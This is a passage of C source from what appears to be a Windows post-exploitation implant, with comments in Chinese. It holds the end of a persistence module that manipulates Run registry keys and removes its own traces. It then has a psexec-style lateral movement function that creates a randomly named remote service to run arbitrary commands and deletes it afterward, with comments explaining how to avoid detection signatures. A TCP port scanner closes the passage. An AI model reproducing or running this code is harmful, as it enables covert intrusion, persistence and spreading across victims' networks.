                        at = oappend(out, cap, at, "    ");
                        at = oappend(out, cap, at, labels[ri]);
                        at = oappend(out, cap, at, "\\Run  ");
                        at = oappend(out, cap, at, vname);
                        at = oappend(out, cap, at, " = ");
                        at = oappend(out, cap, at, (const char *)vdata);
                        at = oappend(out, cap, at, "\r\n");
                        idx++;
                    }
                    RegCloseKey(hKey);
                }
            }
            return at;
        }

    /* ---- 8: 清理本项目写入的痕迹 ---- */
    case 8:
        {
            HKEY hKey = NULL;
            int removed = 0;
            HKEY roots[2];
            int ri;

            roots[0] = HKEY_CURRENT_USER;
            roots[1] = HKEY_LOCAL_MACHINE;
            for (ri = 0; ri < 2; ri++) {
                if (RegOpenKeyExA(roots[ri],
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        0, KEY_SET_VALUE, &hKey) == 0) {
                    if (RegDeleteValueA(hKey, val) == 0) removed++;
                    RegCloseKey(hKey);
                }
            }
            at = oappend(out, cap, 0, removed ? "[+] 已清理注册表项\r\n"
                                              : "[*] 未找到注册表项\r\n");
            return at;
        }

    default:
        return (unsigned int)oappend(out, cap, 0,
            "[-] 持久化模式 1=HKCU 2=HKLM 3=启动目录 7=列出 8=清理\r\n");
    }
}

/* ------------------------------------------------------------ 横向移动 */

/* 原生 psexec: 直接走 SCM 的 OpenSCManager/CreateService/StartService,
 * 不调用 sc.exe —— 少一个子进程, 也少一套命令行特征。
 * 依赖 ADVAPI32 (已在导入表)。 */
unsigned int ops_psexec(const char *host, const char *cmd, unsigned char *out, unsigned int cap)
{
    SC_HANDLE hSCM = NULL, hSvc = NULL;
    char svcName[40];
    char binPath[700];
    char remote[320];
    unsigned int at = 0, i, m = 0;

    if (!host || !host[0] || !cmd || !cmd[0]) {
        return (unsigned int)oappend(out, cap, 0, "[-] 用法: psexec <host> <cmd>\r\n");
    }

    /* \\host */
    remote[0] = '\\';
    remote[1] = '\\';
    for (i = 0; host[i] && m < sizeof(remote) - 8; i++) remote[2 + m++] = host[i];
    remote[2 + m] = 0;

    /* 随机服务名: 固定名是最典型的落地痕迹 */
    {
        unsigned char rnd[4];
        static const char cs[] = "abcdefghijklmnopqrstuvwxyz";
        unsigned int k = 0;
        const char *pfx = "Cs";
        for (i = 0; pfx[i] && k < sizeof(svcName) - 12; i++) svcName[k++] = pfx[i];
        if (csdev_random(rnd, sizeof(rnd))) {
            for (i = 0; i < sizeof(rnd) && k < sizeof(svcName) - 8; i++) {
                svcName[k++] = cs[rnd[i] % 26];
            }
        } else {
            const char *fb = "tmp";
            for (i = 0; fb[i] && k < sizeof(svcName) - 8; i++) svcName[k++] = fb[i];
        }
        svcName[k] = 0;
    }

    {
        const char *pfx = "cmd.exe /c ";
        unsigned int k = 0;
        for (i = 0; pfx[i] && k < sizeof(binPath) - 2; i++) binPath[k++] = pfx[i];
        for (i = 0; cmd[i] && k < sizeof(binPath) - 2; i++) binPath[k++] = cmd[i];
        binPath[k] = 0;
    }

    hSCM = OpenSCManagerA(remote, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        at = oappend(out, cap, 0, "[-] 无法打开远程 SCM (需要目标管理员权限且 445/135 可达)\r\n");
        return at;
    }

    hSvc = CreateServiceA(hSCM, svcName, svcName, SERVICE_ALL_ACCESS,
                          SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                          SERVICE_ERROR_IGNORE, binPath,
                          NULL, NULL, NULL, NULL, NULL);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        at = oappend(out, cap, 0, "[-] 创建服务失败: ");
        at = oappend(out, cap, at, svcName);
        at = oappend(out, cap, at, "\r\n");
        return at;
    }

    if (!StartServiceA(hSvc, 0, NULL)) {
        /* 服务体是短命进程, 启动后立刻退出属正常; 这里只记录不当作失败 */
        at = oappend(out, cap, at, "[*] StartService 返回失败 (服务体已执行完时属正常)\r\n");
    } else {
        at = oappend(out, cap, at, "[+] 服务已启动: ");
        at = oappend(out, cap, at, svcName);
        at = oappend(out, cap, at, "\r\n");
    }

    Sleep(2500);          /* 给服务体一点执行时间, 再清理 */

    if (DeleteService(hSvc)) {
        at = oappend(out, cap, at, "[+] 服务已删除 (痕迹清理)\r\n");
    } else {
        at = oappend(out, cap, at, "[!] 服务删除失败, 需手工清理: ");
        at = oappend(out, cap, at, svcName);
        at = oappend(out, cap, at, "\r\n");
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    at = oappend(out, cap, at, "[*] 目标: ");
    at = oappend(out, cap, at, remote);
    at = oappend(out, cap, at, "\r\n");
    return at;
}

/* ------------------------------------------------------------ 端口扫描 */

unsigned int ops_portscan(const char *host, const char *ports, int timeout_ms,
                          unsigned char *out, unsigned int cap)
{
    unsigned int at = 0;
    unsigned int base = 0;
    int started = 0;

    load_dyn();
    if (!d.WSAStartup || !d.socket_ || !d.connect_) {
        return (unsigned int)oappend(out, cap, 0, "[-] ws2_32 不可用\r\n");
    }
    (void)timeout_ms;

    {
        unsigned char wsadata[512];
        oset(wsadata, 0, sizeof(wsadata));
        if (d.WSAStartup(0x0202, wsadata) == 0) started = 1;
    }

    at = oappend(out, cap, 0, "[*] 扫描 ");
    at = oappend(out, cap, at, host);
    at = oappend(out, cap, at, "\r\n");

    /* ports 形如 "22,80,443" 或 "1-1024" */
    {
        const char *p = ports;
        while (p && *p && at < cap - 64) {
            unsigned int a = 0, b = 0;
            while (*p >= '0' && *p <= '9') { a = a * 10u + (unsigned int)(*p - '0'); p++; }
            if (*p == '-') {
                p++;
                while (*p >= '0' && *p <= '9') { b = b * 10u + (unsigned int)(*p - '0'); p++; }
            } else {
                b = a;
            }
            if (*p == ',') p++;
            if (a == 0) continue;
            if (b < a) b = a;
            if (b > 65535u) b = 65535u;
            if (b - a > 4096u) b = a + 4096u;      /* 上限保护 */

            for (base = a; base <= b && at < cap - 64; base++) {
                SOCKADDR_IN_T sa;
                unsigned int s;
                int rc;

                oset(&sa, 0, sizeof(sa));
                sa.family = 2;                                  /* AF_INET */
                sa.port   = d.htons_ ? d.htons_((unsigned short)base) : (unsigned short)((base >> 8) | (base << 8));
                sa.addr[0] = d.inet_addr ? d.inet_addr(host) : 0;
                if (sa.addr[0] == 0xFFFFFFFFu) {
                    at = oappend(out, cap, at, "[-] 地址解析失败\r\n");
                    if (started) d.WSACleanup();
                    return at;
                }

                s = (unsigned int)d.socket_(2, 1, 0);           /* AF_INET, SOCK_STREAM */
                if (s == 0xFFFFFFFFu) continue;

                rc = d.connect_(s, &sa, sizeof(sa));
                if (rc == 0) {
                    char line[32];
                    int n = 0, k;
                    char tmp[8];
                    unsigned int v = base;
                    if (v == 0) tmp[n++] = '0';
                    while (v) { tmp[n++] = (char)('0' + (v % 10)); v /= 10; }
                    oset(line, 0, sizeof(line));
                    for (k = n - 1; k >= 0; k--) line[0 + (n - 1 - k)] = tmp[k];
                    line[n] = 0;
                    at = oappend(out, cap, at, "[+] open ");
                    at = oappend(out, cap, at, line);
                    at = oappend(out, cap, at, "\r\n");
                }
                d.closesocket_(s);
            }
        }
    }

    if (started && d.WSACleanup) d.WSACleanup();
    at = oappend(out, cap, at, "[*] 扫描结束\r\n");
    return at;
}
